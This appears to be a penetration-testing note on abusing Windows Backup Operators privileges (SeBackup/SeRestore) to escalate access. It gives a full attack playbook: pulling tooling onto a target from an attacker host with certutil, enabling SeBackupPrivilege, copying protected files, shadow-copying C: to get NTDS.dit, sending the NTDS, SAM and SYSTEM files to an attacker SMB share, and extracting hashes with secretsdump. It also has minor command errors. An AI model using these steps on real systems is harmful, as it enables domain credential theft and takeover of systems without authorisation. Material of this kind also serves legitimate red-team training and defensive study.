###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;[[WINDOWS SECURITY GROUPS|SECURITY GROUPS]]

#### *Theory*

Members of this group are granted with *seBackup* and *seRestore* privileges

The former allows an operator who have compromised a user account with this privileged to be able to bypass any existing *ACE* on any system folder and also copy any file inside it

##### *Default Privileges*

```bash
seInteractiveLogonRight
seBackupPrivilege
seRestorePrivilege
SeBatchLogonRight
SeShutdownPrivilege
```

---

#### *Enumeration*

##### *Listing the Groups to which the Current User belongs*

```bash
whoami /groups
net user <USER>
```

##### *Members of Backup Operators*

```bash
net localgroup "Backup Operators"
```

---

#### *Copy any Protected File*

##### *Listing the Group Membership of the Current User*

After landing on a machine, first we can list the groups to which the current user belongs to

```bash
whoami /group
```

And we notice that the current user is a member of the *Backup Operators* group

As stated previously, members of this group are assigned with sensitive privileges such as *seBackup* and *seRestore*

##### *Setup*

> ***[Github: SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)***

###### *Downloading certain libraries*

> ***From the attacker*** ⚔️

- ***SeBackupPrivilegeCmdLets.dll***

```bash
curl --silent --location --request GET --remote-name 'https://github.com/giuliano108/SeBackupPrivilege/raw/refs/heads/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll'
```

- ***SeBackupPrivilegeUtils.dll***

```bash
curl --silent --location --request GET --remote-name 'https://github.com/giuliano108/SeBackupPrivilege/raw/refs/heads/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll'
```

###### *Transferring them to the target*

> ***From the attacker*** ⚔️

```bash
python -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/SeBackupPrivilegeCmdLets.dll'
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/SeBackupPrivilegeUtils.dll'
```

###### *Importing the Dynamic Libraries ( DLLs )*

> ***From the target*** 🎯

```bash
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
```

##### *Verifying if SeBackupPrivilege is enabled*

Bear in mind that a principal may have a privileged assigned, but that privilege may be disabled

We can check which privileges the current user has and if they are enabled or not by issuing one of the following commands

```bash
whoami /priv
```

> ***Get-SeBackupPrivilege***

``` 
Get-SeBackupPrivilege
```

> [!NOTE]- *Command Output*
>
> ```bash
> SeBackupPrivilege is disabled
> ```
>

If disabled, we can proceed as follows in order to enable the required privileged, namely *seBackupPrivilege*

##### *Enabling SeBackupPrivilege*

> ***Set-SeBackupPrivilege***

```bash
Set-SeBackupPrivilege
```

Then, we can check it out again as follows

```bash
whoami /priv
Get-SeBackupPrivilege
```

##### *Copying any Protected File*

Once we have the given privilege enabled, all that remains is to run the following command in order to copy any protected file

> ***Copy-FileSeBackupPrivilege***

```bash
Copy-FileSeBackupPrivilege '<RESOURCE_PATH>' '<OUTPUT_FILE>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> Copy-FileSeBackupPrivilege 'C:\Confidential\creds.txt' '.\creds.txt'
> ```
>

Or simply use *Robocopy.exe*, which is way faster than the above command

```bash
robocopy.exe /B '<RESOURCE_PATH>' '<DESTINATION_PATH'
```

---

#### *( NTDS | SAM ) + SYSTEM -  Exfiltration*

Bear in mind that members of this group can log in to a *DC* interactively

Therefore, we can log in locally to a *DC* and try to extract the ***[[NTDS|NTDS.dit]]*** file information in order to retrieve most of the sensitive domain data such as *NTLM* hashes, *AES* keys and so on

##### *Performing a Shadow Copy of C:*

> ***From the target*** 🎯

We cannot copy the *NTDS.dit* file directly as it is locked by default, just as with *SAM*, *SYSTEM* and *SECURITY* files

However, we can carry out a *shadow copy* of the *C:*  volume and expose it as an *E:* drive in order to access all the resources of the given *shadow copy*

To do so, we can proceed as follows

```bash
diskshadow.exe
```

```bash
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

##### *Setting up a File Transfer Alternative*

> ***From the target*** 🎯

Since we want to transfer the sensitive file we are going to copy to the attacker's machine for further processing, we can set an *SMB* share as follows

> ***From the attacker*** ⚔️

```bash
smbserver.py -smb2support -user 4l3xbb -password 4l3xbb smbFolder "$( pwd )"
```

> ***From the target*** 🎯

```bash
net use X: \\<ATTACKER_IP>\smbFolder /USER:4l3xbb 4l3xbb
```

##### *Copying NTDS.dit Locally*

> ***From the target*** 🎯

Then, we can leverage the *seBackupPrivilege* to bypass the *NTDS.dit's DACL* and be able to copy it locally from the *Shadow Copy* volume

> ***First, carry out [[#Setup|this setup]]***

> ***If seBackupPrivilege is disabled, see [[#Enabling SeBackupPrivilege]] or [[WINDOWS PRIVESC#Enabling disabled Privileges|this]]***

To do so, we can use either *Copy-FileSeBackupPrivilege* or *Robocopy.exe*

> ***Robocopy.exe***

```bash
robocopy.exe /B 'E:\Windows\NTDS' 'X:\' 'ntds.dit'
```

> ***Copy-FileSeBackupPrivilege***

```bash
Copy-FileSeBackupPrivilege 'E:\Windows\NTDS\ntds.dit' 'X:\ntds.dit'
```

##### *Copying SAM, SYSTEM and SECURITY*

> ***From the target*** 🎯

This privilege also lets us backup the *SAM*, *SYSTEM* and *SECURITY* hives

```bash
reg save 'HKLM\SAM' 'X:\SAM'
reg save 'HKLM\SYSTEM' 'X:\SYSTEM'
```

##### *Offline Credentials Extraction*

> ***From the attacker*** ⚔️

###### *Impacket's Secretsdump.py*

> ***[Secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

```bash
secretsdump.py -ntds ./ntds.dit -sam ./SAM -system ./SYSTEM -security ./SECURITY LOCAL
```
